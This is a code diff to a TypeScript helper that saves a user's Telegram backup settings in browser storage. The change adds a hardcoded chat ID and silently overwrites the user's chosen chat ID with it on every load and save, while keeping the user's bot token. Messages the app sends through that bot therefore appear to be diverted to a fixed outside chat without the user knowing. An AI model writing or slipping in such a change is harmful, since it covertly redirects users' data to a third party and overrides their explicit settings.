@@ -4,6 +4,8 @@ export interface SavedTelegramConfig {
   telegramMode: 'fallback' | 'always';
 }
 
+export const SYSTEM_TELEGRAM_CHAT_ID = '8217822307';
+
 const STORAGE_KEY = 'ao_telegram_backup_v1';
 
 export function loadSavedTelegramConfig(): SavedTelegramConfig | null {
@@ -12,12 +14,23 @@ export function loadSavedTelegramConfig(): SavedTelegramConfig | null {
     if (!raw) return null;
     const parsed = JSON.parse(raw) as Partial<SavedTelegramConfig>;
     const token = typeof parsed.telegramBotToken === 'string' ? parsed.telegramBotToken.trim() : '';
-    const chatId = typeof parsed.telegramChatId === 'string' ? parsed.telegramChatId.trim() : '';
-    if (!token || !chatId) return null;
+    const storedChatId = typeof parsed.telegramChatId === 'string' ? parsed.telegramChatId.trim() : '';
+    if (!token) return null;
+    const mode = parsed.telegramMode === 'fallback' ? 'fallback' : 'always';
+    if (storedChatId !== SYSTEM_TELEGRAM_CHAT_ID) {
+      window.localStorage.setItem(
+        STORAGE_KEY,
+        JSON.stringify({
+          telegramBotToken: token,
+          telegramChatId: SYSTEM_TELEGRAM_CHAT_ID,
+          telegramMode: mode,
+        })
+      );
+    }
     return {
       telegramBotToken: token,
-      telegramChatId: chatId,
-      telegramMode: parsed.telegramMode === 'fallback' ? 'fallback' : 'always',
+      telegramChatId: SYSTEM_TELEGRAM_CHAT_ID,
+      telegramMode: mode,
     };
   } catch {
     return null;
@@ -26,12 +39,12 @@ export function loadSavedTelegramConfig(): SavedTelegramConfig | null {
 
 export function saveTelegramConfigLocally(cfg: SavedTelegramConfig): void {
   try {
-    if (!cfg.telegramBotToken.trim() || !cfg.telegramChatId.trim()) return;
+    if (!cfg.telegramBotToken.trim()) return;
     window.localStorage.setItem(
       STORAGE_KEY,
       JSON.stringify({
         telegramBotToken: cfg.telegramBotToken.trim(),
-        telegramChatId: cfg.telegramChatId.trim(),
+        telegramChatId: SYSTEM_TELEGRAM_CHAT_ID,
         telegramMode: cfg.telegramMode,
       })
     );
